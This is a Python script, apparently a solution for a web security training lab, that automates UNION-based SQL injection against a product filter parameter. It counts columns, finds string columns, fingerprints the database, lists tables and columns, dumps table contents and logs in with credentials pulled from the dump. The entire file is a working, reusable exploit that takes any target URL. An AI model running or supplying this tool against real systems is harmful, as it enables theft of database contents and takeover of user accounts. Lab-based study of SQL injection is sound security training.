import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    login_url = url + path
    r = s.get(login_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, username, password):
    login_url = url + '/login'
    payload = {
        "csrf": get_csrf_token(s, url, '/login'),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)

    if 'Log out' in r.text:
        print(f'Successful login {username} account')
        print('[+] Successful solved lab')
        sys.exit(0)
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def is_num_col_equal(s, url, path, payload, num: int):
    sql_injection = f"'+ORDER+BY+{num}--%20"
    target_url = url + path + '?' + payload + sql_injection
    r = s.get(target_url)
    if r.status_code == 200:
        return True
    return False

def is_col_string(s, url, path, payload, isOracle, columns):
    sql_injection = f"'+UNION+SELECT+{',+'.join(columns)}+FROM+{'ALL_TABLES' if isOracle else 'information_schema.tables'}--%20"
    target_url = url + path + '?' + payload + sql_injection
    r = s.get(target_url)
    if r.status_code == 200:
        return True
    return False

def get_all_name(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    results = []
    for tr in soup.find_all('tr'):
        if tr.find('th') and not tr.find('td'): # type: ignore
            text = tr.find('th').get_text(strip=True) # type: ignore
            results.append(text)
    results = sorted(results)
    print(results)

def list_all_tables(s, url, path, payload, isOracle, columns):
    sql_injection = f"'+UNION+SELECT+{',+'.join(columns)}+FROM+{'ALL_TABLES' if isOracle else 'information_schema.tables'}--%20"
    target_url = url + path + '?' + payload + sql_injection
    r = s.get(target_url)
    
    get_all_name(r.text)

def list_columns_of_table(s, url, path, payload, isOracle, columns, table_name):
    sql_injection = f"'+UNION+SELECT+{",+".join(columns)}+FROM+{'ALL_TAB_COLUMNS' if isOracle else 'information_schema.columns'}+WHERE+TABLE_NAME+=+'{table_name}'--%20"
    target_url = url + path + '?' + payload + sql_injection
    r = s.get(target_url)

    get_all_name(r.text)

def list_columns_content(s, url, path, payload, table_name, columns):
    sql_injection = f"'+UNION+SELECT+{",+".join(columns)}+FROM+{table_name}--%20"
    target_url = url + path + '?' + payload + sql_injection
    r = s.get(target_url)

    print(r.text)

def version_of_db(s, url, path, payload, num_columns, str_idx: int):
    a = ["banner", "version()", "@@version"]
    db_type = ["Oracle", "PostgreSQL", "Microsoft or MySQL"]
    columns = ['NULL'] * num_columns
    for i in range(3):
        columns[str_idx] = a[i]
        sql_injection = f"'+UNION+SELECT+{",+".join(columns)}{"+FROM+v$version" if not i else ""}--%20"
        columns[str_idx] = 'NULL'
        target_url = url + path + '?' + payload + sql_injection
        print(target_url)
        r = s.get(target_url)

        if r.status_code == 200:
            print(r.text)
            print(f"This page using '{db_type[i]}' database")            
            return
    print("Can't find version of db")

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    PATH = '/filter'
    PAYLOAD = 'category=Accessories'
    IS_ORACLE = True

    num_column = 0
    for i in range(1, 20):
        if is_num_col_equal(s, url, PATH, PAYLOAD, i):
            num_column = i
        else: break
    print(f'[+] Finish test column, number of columns = {num_column}')

    columns = ['NULL'] * num_column
    str_col = []
    for i in range(num_column):
        columns[i] = "'a'"
        if is_col_string(s, url, PATH, PAYLOAD, IS_ORACLE, columns):
            str_col.append(i)
        columns[i] = 'NULL'
    print(f'[+] List of columns is string type: {str_col}')
    if not len(str_col):
        print('[-] This do not contain any string type column')
        return

    while True:
        print('0. Version of db')
        print('1. List all tables')
        print('2. List columns of table')
        print('3. List columns content')
        print('4. Login by credential found in response')
        op = str(input('Choose option: '))
        if op == '0':
            version_of_db(s, url, PATH, PAYLOAD, num_column, str_col[0])
        elif op == '1':
            columns = ['NULL'] * num_column
            if len(str_col): columns[str_col[0]] = 'TABLE_NAME'
            print(f'Columns: {columns}')

            list_all_tables(s, url, PATH, PAYLOAD, IS_ORACLE, columns)
        elif op == '2':
            table_name = input('Which table: ')
            columns = ['NULL'] * num_column
            if len(str_col): columns[str_col[0]] = 'COLUMN_NAME'
            print(f'Columns: {columns}')
            
            list_columns_of_table(s, url, PATH, PAYLOAD, IS_ORACLE, columns, table_name)
        elif op == '3':
            table_name = input('Which table: ')
            columns = ['NULL'] * num_column
            for i in str_col:
                columns[i] = (input(f'Column {i}: '))

            list_columns_content(s, url, PATH, PAYLOAD, table_name, columns)
        elif op == '4':
            username = input('Username: ')
            password = input('Password: ')
            login_acc(s, url, username, password)
        else:
            print('[-] Invalid option')

        check_solved_lab(s, url)
        print()


if __name__ == '__main__':
    main()